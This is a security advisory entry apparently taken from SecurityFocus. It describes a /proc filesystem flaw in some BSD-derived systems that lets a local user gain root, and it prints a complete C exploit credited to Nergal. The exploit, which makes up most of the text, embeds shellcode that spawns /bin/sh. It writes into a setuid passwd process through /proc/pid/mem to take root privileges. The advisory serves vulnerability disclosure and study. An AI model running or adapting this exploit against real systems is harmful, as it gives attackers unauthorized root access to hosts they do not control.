source: http://www.securityfocus.com/bid/940/info

Certain BSD derivative operating systems use an implantation of the /proc filesystem which is vulnerable to attack from malicious local users. This attack will gain the user root access to the host.

The proc file system was originally designed to allow easy access to information about processes (hence the name). Its typical benefit is quicker access to memory hence more streamlined operations. As noted previously
certain implementations have a serious vulnerability. In short, the vulnerability is that users may manipulate processes under system which use /proc to gain root privileges. The full details are covered at length in the advisory attached to the 'Credit' section of this vulnerability entry.

/* by Nergal */
#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>

char            shellcode[] =
"\xeb\x0a\x62\x79\x20\x4e\x65\x72\x67\x61\x6c\x20" 
"\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
"\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
"\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
"\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04\x00";

#define PASSWD "./passwd"
void 
sg(int x)
{
}
int
main(int argc, char **argv)
{
	unsigned int stack, shaddr;
	int             pid,schild;
	int             fd;
	char            buff[40];
	unsigned int    status;
	char            *ptr;
	char            name[4096];
	char 		sc[4096];
	char            signature[] = "signature";

	signal(SIGUSR1, sg);
if (symlink("usr/bin/passwd",PASSWD) && errno!=EEXIST)
{
perror("creating symlink:");
exit(1);
}
	shaddr=(unsigned int)&shaddr;
	stack=shaddr-2048;
	if (argc>1)
	shaddr+=atoi(argv[1]);
	if (argc>2)
	stack+=atoi(argv[2]);
	fprintf(stderr,"shellcode addr=0x%x stack=0x%x\n",shaddr,stack);
	fprintf(stderr,"Wait for \"Press return\" prompt:\n");
	memset(sc, 0x90, sizeof(sc));
	strncpy(sc+sizeof(sc)-strlen(shellcode)-1, shellcode,strlen(shellcode));
	strncpy(sc,"EGG=",4);
memset(name,'x',sizeof(name));
	for (ptr = name; ptr < name + sizeof(name); ptr += 4)
		*(unsigned int *) ptr = shaddr;
	name[sizeof(name) - 1] = 0;

	pid = fork();
	switch (pid) {
	case -1:
		perror("fork");
		exit(1);
	case 0:
		pid = getppid();
		sprintf(buff, "/proc/%d/mem", pid);
		fd = open(buff, O_RDWR);
		if (fd < 0) {
			perror("open procmem");
			wait(NULL);
			exit(1);
		}
		/* wait for child to execute suid program */
		kill(pid, SIGUSR1);
		do {
			lseek(fd, (unsigned int) signature, SEEK_SET);
		} while
			(read(fd, buff, sizeof(signature)) == sizeof(signature) &&
			 !strncmp(buff, signature, sizeof(signature)));
		lseek(fd, stack, SEEK_SET);
		switch (schild = fork()) {
		case -1:
			perror("fork2");
			exit(1);
		case 0:

			dup2(fd, 2);
			sleep(2);
			execl(PASSWD, name, "blahblah", 0);
			printf("execl failed\n");
			exit(1);
		default:
			waitpid(schild, &status, 0);
		}
		fprintf(stderr, "\nPress return.\n");
		exit(1);
	default:
		/* give parent time to open /proc/pid/mem */
		pause();
		putenv(sc);
		execl(PASSWD, "passwd", NULL);
		perror("execl");
		exit(0);

	}
}